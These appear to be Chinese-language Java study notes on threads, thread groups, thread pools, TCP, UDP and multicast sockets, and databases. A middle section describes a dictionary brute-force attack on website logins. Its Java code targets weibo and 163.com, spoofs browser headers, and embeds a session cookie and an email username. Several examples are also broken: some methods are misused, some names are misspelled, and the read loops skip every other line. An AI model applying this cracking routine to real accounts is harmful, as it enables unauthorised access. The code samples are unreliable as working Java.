							System.out.println(Thread.currentThread().getName()+", You have got the money you want to draw: "+drawAccount);
							balanceAccount.setAccount(balanceAccount.getAccount()-drawAccount);
							System.out.println("The amount of money you left in the account is: "+balanceAccount.getAccount());
							System.out.println(i);
							i++;
						}
						else
						{
							System.out.println(Thread.currentThread().getName()+", The amount of money in your account is not enough!");
						}
						//set the flag value
						balanceAccount.setDeposit(false);
						//notify all the other values
						balanceAccount.notifyAll();
					}
					else
					{
						balanceAccount.wait();
					}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}	
	class  depositThread extends Thread
	{
		//the amount of money you want to get 
		private int depositAccount;
		//the amount of money in your account
		private Account balanceAccount;
		depositThread(int adepositAccount,Account abalanceAccount)
		{
			this.depositAccount=adepositAccount;
			this.balanceAccount=abalanceAccount;
		}
		public void run() 
		{
			int j;
			//add the concurrelock on the code block
			try
			{
				synchronized(balanceAccount)
				{
					for(j=0;j<100;)
					{
					if(balanceAccount.hasdeposted==false)
					{
						System.out.println(Thread.currentThread().getName()+", You have deposit the money you want to : "+depositAccount);
						balanceAccount.setAccount(balanceAccount.getAccount()+depositAccount);
						System.out.println("The amount of money you left in the account is: "+balanceAccount.getAccount());
						System.out.println(j);
						//set the flag value
						balanceAccount.setDeposit(true);
						//notifyAll all the other threads
						balanceAccount.notifyAll();
						j++;
					}
					else
					{
						balanceAccount.wait();
					}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}
>	
	public class ThreadCommuniTest
	{
		//the main thread
		public static void main(String[] args) throws Exception
		{
			Account ac = new Account("wt",1000);
			new depositThread(800,ac).start();
			new drawThread(800,ac).start();
		}
	}


线程组与未处理的异常
`Java`中用一个类`ThreadGroup`表示线程组。  
怎样将线程方法放入指定的线程组中？在构造线程对象的时候在构造器中设置器所在的线程组。  
将线程放入线程组之后，就能够对线程组中的线程进行整体的管理。  
线程组里面还可以包含线程组。
使用线程组的时候，需要实现`Runnable`接口或者`Callable`接口，而不要去继承`Thread`类。这样方便与将线程加入线程组。  
线程组对其内的线程的控制：  
1. setDaemon():将这个线程组设置为后台线程组，但并不是将其内的线程设为后台线程。后台线程组的作用在于：当后台线程组里面所有的线程都死亡了，那么这个后台线程组本身也会自动销毁。否则要销毁后台线程组只能调用其destory()方法。  
2. setPriority()：设置线程组的优先级，表示线程组里面的线程的优先级不会超过线程组的优先级。但是这只会限制在设置线程组优先级之后加入的线程的优先级，对于设置线程组优先级之前的线程是没有影响的。  
3. 用于线程异常处理的方法：*在JDK1.5以前*，如果线程出现了异常，系统会自动回调它所在的线程组的uncaughtException()方法来修复异常。也就是说，让线程组帮助线程处理异常。*在JDK1.5以后*，可以由线程自己设置异常处理器(本线程类或者类对象调用给异常处理方法即可），无需线程组帮忙处理了。

线程异常处理的三种方法，由于任何一个线程所要运行的代码都放在该线程的run()方法内部，所以如果要在run()方法外处理异常，就需要run()方法throws Exception，然而，由于run()方法是重写而来，原来的run()方法是没有throws Exception的，所以重写之后也不能throws Exception。因此，我们就需要使用其他的方式而不是依靠run()方法throw来处理异常。所以在Thread类和ThreadGroup类中都有专门的异常处理方法。

线程异常处理方法：  
方法1：使用`ThreadGroup`类的处理方法进行处理
>
	public class ThreadGroupExceptionTest implements Runnable
	{
		public void run()
		{	
			for(int i=0;i<100;i++)
			{
				System.out.println(100/(i-20));
			}
		}
		public static void main(String[] args) 
		{
			ThreadGroup tg = new ThreadGroup("tg1"){
				//set the thread exception dealer func
				//the threadgroup deal the exception for the thread
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			};
>			
			ThreadGroupExceptionTest tgt = new ThreadGroupExceptionTest();
			//construct the thread, add it to the threadgroup
			Thread t = new Thread(tg,tgt);
			t.start();
>			
			//construct the thread, add it to the threadgroup
			Thread t1 = new Thread(tg,tgt);
			t1.start();
>			
			//calculate the num of the thread in the threadgroup
			System.out.println(tg.activeCount());
>			
			//the threadgroup with dealing fun an deal with the exception came out of the threads in the threadgroup but not the thread came out of the threadgroup
			System.out.println(20/0);
		}
	}



方法2:使用`Thread`类的处理方法,各个`Thread`对各自的`Thread Exception`进行处理
>
	public class ThreadExceptionTest implements Runnable
	{
		public void run()
		{	
			for(int i=0;i<100;i++)
			{
				System.out.println(100/(i-20));
			}
		}
		public static void main(String[] args) 
		{
			ThreadExceptionTest tgt = new ThreadExceptionTest();
>			
			Thread t = new Thread(tgt);
			//set the exception dealer func 
			// the thread itself but not the threadgroup deal with its own but not all the exceptions for the thread
			t.setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
			t.start();
>			
			Thread t1 = new Thread(tgt);
			//set the exception dealer func 
			// the thread itself but not the threadgroup deal with its own but not all the exceptions for the thread
			t1.setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
			t1.start();
>			
			//the thread dealing fun can also deal the exception came out of the main thread
			Thread.currentThread().setUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
			System.out.println(20/0);
		}
	}


方法3：使用`Thread`类的`static`处理方法,对所有`Thread`出现的`Thread Exception`进行处理
>
	public class ThreadDefaultExceptionTest implements Runnable
	{
		public void run()
		{	
			for(int i=0;i<100;i++)
			{
				System.out.println(100/(i-20));
			}
		}
		public static void main(String[] args) 
		{
			//set the exception dealer func 
			// the thread itself but not the threadgroup deal with all the exceptions for the threads
			Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler(){			
				public void uncaughtException(Thread t, Throwable e) 
				{
					System.out.println("The Error occure in the thread: "+t.currentThread().getName()+e.getMessage());
				}
			}); 
>			
			ThreadDefaultExceptionTest tgt = new ThreadDefaultExceptionTest();
			Thread t = new Thread(tgt);
			t.start();
>			
			Thread t1 = new Thread(tgt);
			t1.start();
>			
			//the thread dealing fun can also deal the exception came out of the main thread
			System.out.println(20/0);
		}
	}


线程池（`Pool`）  
池的本质，就是一种“缓存”技术。当某些东西创建的时候需要很大代价的时候，用完它不会立刻扔到，而是留下来，供以后使用。是否要缓存一个东西的决定点在于这个东西的创建成本，也要考虑系统的内存。  
缓存的本质是：以牺牲空间换时间。  
线程的创建成本比较大。虽然创建线程的成本比创建进程的成本小的多，但相比于普通的Java``对象，`Thread`对象的创建成本依然较大。  
为解决此问题，我们需要使用线程池。  
`JDK1.5`之后，提供了良好的线程池支持，依靠`Executors`类以实现线程池。这个类是创建线程池和线程工厂的工具类。 `ExecutorService`就是线程池类。`ScheduledExecutorService`也是线程池，其是`ExecutorService`的子接口，功能比`ExecutorService`强（可以周期性调用某一个线程）。  

线程池使用步骤：  
1. 使用`Executors`静态工厂工具类创建线程池对象(`ExecutorService`对象或者`ScheduledExecutorService`对象)。线程池对象里面放的是空闲的线程资源。  
2. 调用`ExecutorService`对象或者`ScheduledExecutorService`对象的方法来提交我们自己的线程(使用`submit()`方法或者`scheduleAtFixedRate()`方法)。线程提交之后并不会立即被启动，而是取决于线程池中是否有空闲的线程资源。  
3. 线程池没有结束，本程序就不会结束。要调用`shutdown()`方法结束线程池。  

注意这里的`ScheduledExecutorService`线程池可以让某一个线程每隔一定的时间就运行一次，这是一个周期性的运行，这一点可以运用到许多的事儿上。则个线程池的周期性事件的方法是`scheduleAtFixedRate()`方法。
而且使用线程池更简单。
 
工具类：`Arrays`、`Objects`、`Collections`、`Paths`、`Files`、`Executers`。  



怎样开不同的线程，各个线程中做不同的事？  
1. 只写一个线程类，一个线程类中只能有一个`run()`方法，然后用这一个线程类创建多个不同的线程，调用`start()`方法，其中的`run()`方法中进行判断，针对不同的线程执行不同的代码即可。  
2. 做几个不同的事就写几个线程类，每个线程类都有自己的`run()`方法，各个`run()`方法里就是各个线程要做的事。然后对各个线程类建立自己的对象，对各个对象调用`start()`方法。


匿名内部类可用于：  
1. 创建接口变量所引用的对象。  
2. 创建抽象类变量所引用的对象。  
3. 创建任何一个类变量所引用的其子类对象，即使没有写出它的子类的名字，这也就是匿名内部类的特点，父类的子类、接口的实现类、抽象类的实现类等都没有类名，而是直接创建了这些类的类对象。






Java中的网络
-------------
网络已经不再是简单的通信工具，计算机已经成为网络的一部分，网络即是计算机。这个就是云计算的概念。  
移动互联网：所有的移动终端、PC端都可以通过有线、无线方式接入到互联网，扩充互联网的概念。  
物联网：要求家里的所有电器都不再是单纯的电器。它们都具有操作系统，都需要连入互联网。这种模式让互联网模式更为扩大。使所有电器都能通过网络控制。


OSI分层：是一种非常理论化的分层，分为7层，是一个理论上的东西。  
TCP/IP分层：实际上上使用的分层。分为4层。  
物理层+数据链路层：用于传输最底层二进制。  
网络层：IP协议(Internet Protocal)，复制为网络上的节点分配唯一标识。  
传输层：TCP协议，实际上TCP协议与IP协议被一起设计出来，经常被放在一起提出。  
应用层:HTTP协议、FTP协议、SMATP协议、POP3协议，应用层的各个协议都用于不同的应用功能。


IP地址：IP地址可以是一台PC机、一台打印机、路由器上的某一个接口。作用：为网络上的每个物理节点(广义上)分配一个门牌号。通过IP地址可以保证网络数据包能正确地找到物理节点。IPV4(32位,只有40亿个地址)与IPV6(128位，地址无数).

关于IPV4，由于总共全世界直邮40亿个IPV4地址，所以导致地址不够，这样，可能整个小区或者整个学校的校园网只有几个IP地址，这个范围内的所以机器都属于这个子网共享这几个IP地址，各机器通过子网掩码进行区分。也就是说，整个学校的机器的IP地址都是一样的，但是每一个机器的子网掩码是不同的，这样在传输数据的时候，会先通过IP地址到达本校，然后通过子网掩码在本子网的范围内找到我们要的机器。也就是说，将IP地址与子网掩码配合起来使用。  
同时，由于IPV4地址不够用，就产生了一个动态IP，对于有些机器，当其在不使用的时候，就将其IP地址分配给其他机器使用，下次使用的时候重新分配。导致这个机器的IP地址是不固定的，处于动态变化。这样的动态IP就会导致一定的问题，对于有些机器，如果IP地址改变以后就不再能被找到了。所以出现了IPV6地址，这样可以提供更多的IP地址。

端口：对于一台机器，上面有多个应用程序在运行，每个程序在接收数据的时候，数据可以通过IP地址与子网掩码找到目的主机。但是难以找到这个主机上的目的应用程序，这样就需要端口，为每个应用程序提供接口，端口相当于这个栋楼上的某个房间号。IP地址相当于这栋楼的门牌号。  
端口的约定：0~65535个。  
其中0~1023：公用端口，我们就不要去使用了。80(HTTP)21(FTP)、110(POP)。  
1023~49151：公用程序端口。MySQL(3306),Oracle(1521)。  
49152~65535：动态分配的端口，不是给应用程序使用的。


InetAddress:该类代表标准IP地址，不带端口。其有两个子类，一个代表IPV6，一个代表IPV4。  
InetSocketAddress：机器上的程序的地址，包括IP地址+端口号。  

InetAddress使用：通过该类的各种方法获得这个类对象所代表的IP地址的各种属性。

InetAddress类使用示例：
>
	import java.net.*;
	public class InetAddressTest
	{
		public static void main(String[] args)  throws Exception
		{
			//this InetAddress is an address class,it represents an IP address.
			//this class provades several methods to test the IP Address features.
			InetAddress iaddr = InetAddress.getByAddress(new byte[]{(byte)218,59,(byte)186,75});
			//get the host name of this IP address
			System.out.println(iaddr.getHostName()); 
			//test the ip address is reachable, just like the cmd line: ping
			System.out.println(iaddr.isReachable(5000)); 
		}
	}


网络编程里面的两个常用工具类：  
URLDecoder与URLEncoder类：用于对字符串进行编码与解码。  
URLEncoder类：可以将所有“非西欧文字”编码成"%B7%E8"这样的格式。这种转换的作用是：在某些场景下，是无法传输与储存"非西欧文字"的，此时就需要使用URLEncoder这个类将"非西欧文字"(例如：中文字符)编码成西欧文字格式，再进行传输与储存。例如，Cookie的值就不能是中文。另，注意，这个转换只能转换“非西欧文字”，如果字符串中有英文，那么其中的英文是不会被转换的，而是保持原样。  
URLDecoder：可以把被URLEncoder编码后的文字转换为原来的文字。

URLEncode类与URLDecode类使用示例：
>
	import java.net.*;
	public class EncodeTest
	{
		public static void main(String[] args)  throws Exception
		{
			encode the string in sepecific charset
			String enStr = URLEncoder.encode("你好","GBK");
			System.out.println(enStr);
			String deStr = URLDecoder.decode(enStr,"GBK");
			System.out.println(deStr);
		}
	}




网络地址：包括协议+IP地址+端口+要访问的文件名。  
网络地址实际上代表的就是主机服务器上的某个文件的路径与地址。客户端可以通过一个服务器上的文件的URL向这个服务器请求这个文件。服务器发送了这个文件之后，客户端再解析这个文件，显示文件内容。
URL：代表一个网络地址。  
URLConnection：代表一个网络地址连接。  
HttpURLConnection：代表一个基于Http的网络地址连接。  

1. 使用URL类的方法获得这个这个URL地址的特性。  
还可以使用openStream()方法获得与这个服务器端存放的文件的连接在一起的InputStream流对象。然后通过这个输出流对象将这个文件传输过了，也就是下载到本地，实际上这就是爬虫爬网页的操作。  
2. 另外可以通过openConnection()方法获得一个URLConnection对象，实际上就是建立与远程URL之间的连接。再通过这个URLConnection的getInputStream()方法等获得这个文件。注：在使用Http协议的时候，使用openConnection()方法获得一个URLConnection对象实际上就是HttpURLConnection连接。HttpURLConnection类是URLConnection类的子类。  
当获得了HttpURLConnection连接之后，可以模仿浏览器提交请求，模仿浏览器获取服务器的响应。


URL类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class URLTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://www.sohu.com/");
			System.out.println(u);
			System.out.println(u.getProtocol());
			System.out.println(u.getFile());
			System.out.println(u.getHost());  
>			
			InputStream is = u.openStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}  


`URLConnection`类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class URLConnectionTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://www.sohu.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
>			
			System.out.println(uc); 
			InputStream is = uc.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}

`HttpURLConnection`类使用示例：
>
	import java.net.*;
	import java.io.*;
	public class HttpURLConnectionTest
	{
		public static void main(String[] args)  throws Exception
		{
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://money.163.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
			HttpURLConnection huc = (HttpURLConnection)uc;
			
			huc.connect();
			InputStream is = uc.getInputStream();
			BufferedReader br = new BufferedRe ader(new InputStreamReader(is));
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}
	}

网站登录密码破解：使用字典文件进行暴力破解。  
字典：一个文档，里面存放的是各种字符的组合，也就是有很多的字符串，在暴力破解的时候，用字典里的字符组合去依次进行输入试探，以达破解密码的目的。  

网站破解步骤：  
1. 建立`HttpURLConnection`连接。
2. 修改设置登陆页面的`Request`特性，使用`setRequestProperty()`方法设置我们自己的的请求特性(`RequestProperty`)，假装后面的请求来自正规浏览器。  
3. 设置输入、输出都为`true`。
4. 从字典文件中读取字符串。  
5. 将字符串发送到远程服务器中的登陆页面。  
6. 接收远程服务器返回的数据，查找返回数据中是否有“登陆成功”这样的字样，如果有，那么就是正确的密码。  
7. 2~6步骤进行循环，每读取一次密码组合都设置一次`Request`特性，发送一次数据，接收一次数据，比对一次收到的数据。


网站登录密码暴力破解使用示例（不完全版）：
>
	import java.net.*;
	import java.io.*;
	public class WebsitCrackTest
	{
		public static void main(String[] args)  throws Exception
		{
			//建立一个HttpURLConnection连接
			//URL means the name and path of the file in the host server 
			URL u = new URL("http://money.163.com/");
			//get the urlconnection, it is the conection between local machine and host server
			URLConnection uc = u.openConnection();
			//transform the URLConnection to HttpURLConnection,HttpURLConnection is the subClass of URLConnection.
			HttpURLConnection huc = (HttpURLConnection)uc;
>			
			//读取字典文件
			BufferedReader br = new BufferedReader(new FileInputStream(new File("dic.txt")));
			String passwd = null;
			try
			{
				while((passwd=br.readLine())!=null)
				{
					//设置请求特性，假装成一个浏览器的请求特性
					huc.setRequestMethod("Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
					huc.setRequestMethod("Accept-Encoding:gzip,deflate,sdch");
					huc.setRequestMethod("Accept-Language:en,zh-CN;q=0.8,zh;q=0.6,en-US;q=0.4");
					huc.setRequestMethod("Cache-Control:max-age=0");
					huc.setRequestMethod("Connection:keep-alive");
>					
					huc.setRequestMethod("Cookie:SINAGLOBAL=8825319064781.07.1403880617735; UUG=usr1024; UV5=usrmdins31284; _s_tentry=login.sina.com.cn; Apache=7425474273040.891.1404887269139; ULV=1404887269196:157:111:48:7425474273040.891.1404887269139:1404886212734; myuid=1702227501; SUB=AQPtL6KmQfJpO1wjc%2BSyogVaZLhQn4kx6f0LHxjRCB9dq1GHJxPch7QumasQfwBm5tOXmbo1e%2FljSjLyg4Ho1B%2BZRYZuyJh%2FbzgoGTrg6WBBoscISzrrpMd5AumRrEa%2Bo16ZCeavsKNzZFdyz%2B4PK2nhu6m9VizCZJKfY2e8dKZu; SUBP=002A2c-gVlwEm1dAWxfgXELuuu1xVxBxAuLIWhDMeo9gyfNEJVgSOxiuHYqW8lZpXYODHSZDM0oC_emc1AopXivJHcsb0%3D%3D; login_sid_t=0a52bcf3e3ea1e6ad50be59e449ff192; UOR=passport.weibo.com,weibo.com,login.sina.com.cn");
>					
					huc.setRequestMethod("Host:weibo.com");
					huc.setRequestMethod("If-Modified-Since:Wed, 09 Jul 2014 06:36:10 GMT");
>					
					huc.setRequestMethod("Referer:http://login.sina.com.cn/sso/logout.php?entry=miniblog&r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D%252F");
>					
					huc.setDoOutput(true);
					huc.setDoInput(true);
					huc.connect();
>					
					//打开本机的输出流，也就是远程主机的输入流,向远程主机发送数据
					PrintScream ps = new PrintStream(huc.getOutputScream());
					ps.print("username =trileverwt31204@sina.com&passwd = " +passwd);
					ps.flush();
>					
					BufferedReader br1 = new BufferedReader(new inputStreamReader(huc.getInputStream()));
					string line = null;
					while((line=br1.readLine())!=null)
					{
						if(line.contains("登陆成功"))
						{
							System.out.println("the correct passwd is : "+ line);
						}
					}
				}
			}
			catch(Exception e)
			{
				System.out.println("Error");
			}
		}
	}

`TCP`通信

`TCP`协议：如果两台计算机需要连接，那么`TCP`协议就会让他们之间建立一个连接：用于发送与接收数据的虚拟链路。见`TCP`协议图。  
实际上这条链路两端连接的东西叫：`socket`，**相当于一个插座**。客户端程序和主机端程序都是建立在`socket`之上的。在客户端，通过`TCP`协议将程序发出的信息包转换、排列、发送出去(通过`socket`)；在主机端，在`socket`收到了数据之后，也通过`TCP`协议将`socket`收到的数据转换恢复过来。也叫套接字。实际上就是**插座**的意思。   
`TCP`协议负责收集这些信息包，并将它们按适当的次序排好、通过下面的`socket`发送。在接收端的`socket`收到数据之后再通过`TCP`协议将其正确还原。  
`TCP`协议保证了数据包在传送过程中准确无误。其使用重发机制：也就是收信者接收到消息之后，需要发送确认信息。否则发送者会重复发送刚才发送的信息。通过这种机制，`TCP`协议为应用程序提供了可靠的通信连接。使其能够适应网络环境的各种变化。保证通信的可靠。
 
`TCP`通信的关键：  
1. `socket`--相当于“虚拟链路”两端的插座，其负责完成通信。  
2. `ServerSocket`--其只负责“接受”连接，用于产生`socket`。  

所以为了实现客户端与服务端的通信，两端都要有`socket`，也就是需要两个`socket`。步骤如下：  
1. 在服务器端  
a. 创建`ServerSocket`对象，但是注意，`ServerSocket`本身并不是`socket`，其不能用来通信，而是用于监听的。  
b. `ServerSocket`对象处于服务器端，该对象调用`accept()`方法后，就会一直等待，监听客户端是否发送请求。当监听到客户端的请求之后，该方法就会返回一个`socket`对象，否则就会一直处于等待状态（`accept`方法会阻塞线程）。这个就是客户端的`socket`对象，用于通信。  
创建`ServerSocket`时，使用端口有规定。  
c. 通过`I/O`流(`BufferedReader`)读取客户端发送过来的数据，也可以通过`I/O`流(使用`PrintStream`)向客户端发送数据。  
2. 在客户端  
a. 直接创建`socket`对象，参数有`IP`地址与程序端口号，`IP`地址是服务器主机的`IP`地址，程序端口号就是服务器端程序所使用的端口号。  
b. 通过`I/O`流(使用`PrintStream`)向服务器段发送数据，也可以通过`I/O`流(`BufferedReader`)从服务器端接收数据。

数据传输`socket`使用示例：  
`ClientSocket`：  
>  
	import java.net.*;
	import java.io.*;
	public class ClientSocketTest
	{
		public static void main(String[] args) 	throws Exception
		{
				try
				{
					//construct an InetAddress object
					 InetAddress iad = InetAddress.getByAddress(new byte[]{10,23,94,(byte)225});
					//connect to the server
					Socket s = new Socket(iad,30000);
>					
					//no matter when and where to output, you'd better transform the OutputStream into the PrintStream object.
					//no matter when and where to input, you'd better transform the InputStream into the BufferedReader object.
>					
					//read from the inputstream which came from the server socket.
					InputStreamReader isr = new InputStreamReader(s.getInputStream());
					BufferedReader br = new BufferedReader(isr);
					System.out.println(br.readLine());
>					
					//write into the printStream which link to the server socket
					PrintStream ps = new PrintStream(s.getOutputStream());
					ps.println("hello");
				}
				catch(Exception e)
				{
					System.out.println("error");
				}
			}	
	}


`ServerSocket`:  
>
	import java.net.*;
	import java.io.*;
	public class ServerSocketTest
	{
		public static void main(String[] args) throws Exception
			{
				ServerSocket ssc = new ServerSocket(30000); 
				System.out.println("Waiting for connections......");
				Socket sk = ssc.accept();
>				
				//no matter when and where to output, you'd better transform the OutputStream into the PrintStream object.
				//no matter when and where to input, you'd better transform the InputStream into the BufferedReader object.
>				
				//write into the printStream which link to the client socket
				PrintStream ps = new PrintStream(sk.getOutputStream());
				ps.println("hi");
>				
				//read from the inputstream which came from the client socket.
				InputStreamReader isr = new InputStreamReader(sk.getInputStream());
				BufferedReader br = new BufferedReader(isr);
				System.out.println(br.readLine());
			}	
	}


注：使用ipconfig可以查询本机IP地址，在子网中，查询的就是本机IP。如果是在公网中，那么就有自己独立的IP地址，而不是与人共用的IP地址。
在ip138上查询的是公网IP，也就是分配给学校的IP地址，公网IP地址整个学校也只有那么几个。公网IP和本机的子网掩码一起进行计算得到的就是处于子网中的本机IP地址，这个本机IP地址就是通过ipconfig命令查询而来的IP地址。

关于输入输出：  
输出时最好都转化成PrintStream进行输出(将OutputStream转化为PrintStream)，因为更方便。  
输入时最好都转化为BufferedReader进行输入(将InputStream转化为BufferedReader)，因为这样最方便。  
以上两条就是输入、输出（无论是网络还是磁盘）的最好的方法。


`UDP`协议通信  
`UDP`协议无需建立虚拟链路，其传输是不可靠的。  
A节点以DatagramSocket发送数据报(类似与集装箱)，数据报携带数据，数据报上有目标地址，大部分情况下，数据报会抵达目标地址。  
在某些时候，数据报会丢失——丢失了也不管。  
UDP协议可能出现的情况：先发送的信息，反而后抵达目的。  

常用的类：`DatagramSocket`与`DatagramPacket`。
`DatagramSocket`：相当于“码头”，用于发送、接收数据报（也就是数据集装箱）。  
`DatagramPacket`：相当于“数据集装箱”，也就是数据报。其作用是将数据装在一起。    
客户端一般不指定端口，因为不知道所需端口是否已经被占用。  
发送端：  
1. 先创建码头(DatagramSocket)。无需固定IP。  
2. 创建有数据、有目标地址(接收端服务器的IP地址与端口)的数据报。  
3. 发送

接收端：  
1. 创建有固定IP、固定端口的码头(`DatagramSocket`)。  
2. 创建空的数据报。  
3. 接收。
 
注意：在接收端接收到数据报之后，就可以从这个数据报中找到该数据报等待发送者的IP地址与端口。从而可以用这个IP地址向发送者返回数据报。  

UDP协议通讯与TCP协议通信的区别在于：  
TCP协议通信时，需要使用I/O来发送与读取数据。  
UDP协议通信时，不需要使用I/O来发送与读取数据。  

UDP协议使用示例：  

`UDP`一端：  
>
	import java.net.*;
	import java.io.*; 
	public class UDPBTest
	{
		final static int Server_PORT=30000;
		public static void main(String[] args) 
		{
			try
			{
				//construct client's DatagramSocket without specific port
				DatagramSocket dgs = new DatagramSocket();
				BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
				String content = null;
				while((content=br.readLine())!=null)
				{
					InetAddress iaa = InetAddress.getByAddress(new byte[]{10,23,94,(byte)253});
					//construct a DatagramPacket, it is aimed at storing the data which will be transmitted by DatagramSocket,with server's address and port.
					//the DatagramPacket should has the address and the port it aimed at
					DatagramPacket dgp = new DatagramPacket(content.getBytes(),content.length(),iaa,Server_PORT); 
					//send the data
					dgs.send(dgp); 
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}

`UDP`另一端：  
>
	import java.net.*;
	public class UDPATest
	{
		final static int MAX_SIZE=102400;
		final static int PORT=30000;
		public static void main(String[] args) 
		{
			try
			{
				//construct a DatagramSocket with specific port
				DatagramSocket dgs = new DatagramSocket(PORT);
				while(true)
				{
					//construct a DatagramPacket, it is aimed at storing the data which get by DatagramSocket
					DatagramPacket dgp = new DatagramPacket(new byte[MAX_SIZE],MAX_SIZE);
					//store the data into the DatagramPacket
					dgs.receive(dgp); 
					System.out.println(new String(dgp.getData(),0,dgp.getLength()));
				}
			}
			catch(Exception e)
			{
				System.out.println("error");
			}
		}
	}



在使用`TCP`协议建立聊天程序的时候，需要建立一个服务器，将所有的内容进行转发到相应的客户端。  
但是在使用`UDP`协议建立聊天程序的时候，无需建立服务器，可以二者直接聊天。  


MuleticastSocket类：也是一个UDP协议，也是一个"码头",使用的时候也是需要与数据集装箱"DatagramPacket"联合使用。  
这是一个广播Socket，无需服务器。先设立一个特殊的IP地址(广播地址)，任何一个客户端向这个特殊的IP地址发送数据后，这个数据会被自动广播到所有加入了该IP地址的客户端。  
该类的方法setTimeToLive(int ttl):  

发送：  
与DatagramSocket类的使用方式是一样的，只是数据报地址是一个特殊的IP地址（广播地址）。  

接收：  
1. 要先调用joinGroup()方法加入这个广播地址。
2. 然后才能接收广播数据。

广播发送、接收使用示例：  
>
	import java.net.*;
	import java.io.*; 
	public class MultiBroadCastTest
	{
		//the default port
		final static int MULTI_PORT=30000;
		//the default IP address
		final static String CAST_IP="230.0.0.1";
		final static int MAX_SIZE=102400;
		public static void main(String[] args) throws Exception
		{
			new Thread(new SendThread()).start();
			new Thread(new RecieveThread()).start();
		}
	}
>	
	//the send thread
	class SendThread implements Runnable
	{
		public void run()
		{
			try
			{ 	
				//construct a multicastsocket
				MulticastSocket socket = new MulticastSocket();
				socket.setTimeToLive(1);
				InetAddress iaa = InetAddress.getByName(MulticastSocketSendTest.CAST_IP) ;
				BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
				String content = null;
				while((content=br.readLine())!=null)
				{
					//construct a DatagramPacket, it is aimed at storing the data which will be transmitted by DatagramSocket,with server's address and port.
					DatagramPacket dgp = new DatagramPacket(content.getBytes(),content.getBytes().length,iaa,MulticastSocketSendTest.MULTI_PORT); 
					//send the data
					socket.send(dgp); 
				}
			} 
			catch(Exception e)
			{
				e.printStackTrace();
			}
		}
	}
>	
	//the receive thread
	class RecieveThread implements Runnable
	{
		public void run()
		{
			try
			{ 
				//construct a multicastsocket
				MulticastSocket socket = new MulticastSocket(MulticastSocketSendTest.MULTI_PORT);
				InetAddress iaa = InetAddress.getByName(MulticastSocketSendTest.CAST_IP) ;
				socket.setTimeToLive(1);
				socket.joinGroup(iaa);
				while(true)
				{
					//construct a DatagramPacket, it is aimed at storing the data which get by DatagramSocket
					DatagramPacket dgp = new DatagramPacket(new byte[MulticastSocketSendTest.MAX_SIZE],MulticastSocketSendTest.MAX_SIZE);
					//store the data into the DatagramPacket
					socket.receive(dgp); 
					System.out.println(new String(dgp.getData(),0,dgp.getLength()));
				}
			} 
			catch(Exception e)
			{
				e.printStackTrace();
			}
		}
	}
TTL:控制要被发送的数据报可以跨过多少网段。
TTL=0：该数据报只能停留在本机。 
TTL=1：该数据报只能停留在当前的局域网中。  
TTL=32：该数据报只能停留在本站点的网络中。  
TTL=64：该数据报只能停留在本地区。  
TTL=128：该数据报只能停留在本大洲。  
TTL=255：这是最大的，该数据报能到达全世界。
 

注：无论是在UDP通信还是MulticastSocket广播通信，发送端的Socket对象都无需设置IP地址与Port端口；接收端的Socket对象必须设置接收Port端口。发送端的Packet对象需要设置目的IP地址与端口Port，接收端的Packer对象无需设置Port接口或者IP地址。




#Java中的数据库
--------
`C/S`：所有的`app`与应用程序都是`C/S`架构  
`B/S`：我们登陆的所有网站都是`B/S`架构  

应用程序与数据库之间的关系：  
1. 应用程序响应人的操作，向数据库发出请求。显示数据库返回的数据。  
2. 数据库响应应用程序的操作，向应用程序返回相应的数据结果。  

编写应用程序的目的：*处理*从数据库中返回的数据。

什么叫做关系型数据库：就是数据库中的表之间，通过*键的形式予以连接*，例如，*学生基本信息表*中的*学生编号是主键*，在*学生考试成绩表*中，*学生编号是外键*。这两张表通过学生编号这个键予以连接，这就是关系数据库的特征。这样两张表就能够联接查询、操作。  

`DB`：`DataBase`：数据库，本质上就是存储在磁盘上的各种格式的数据文件。  
`DBMS`：`DataBase Management System`：数据管理系统。用于管理数据库。  
`DBA`：`DataBase Administrators`：数据库管理员。软件公司没有数据库管理员，只有使用软件的企业里采用数据库管理员。工作是数据控制、管理、备份等。

数据库软件中数据库分类：
a.系统数据库 
在数据库软件安装完成之后，就会有几个**系统数据库**  
**系统数据库**的作用就是：管理我们自己创建的用户数据库。当我们在数据库中储存自己的数据，我们自己创建的这些数据库(**用户数据库**)需要被**系统数据库**管理与控制。系统数据库不能删除不能修改。  
例如：在SQLServer数据库软件中  
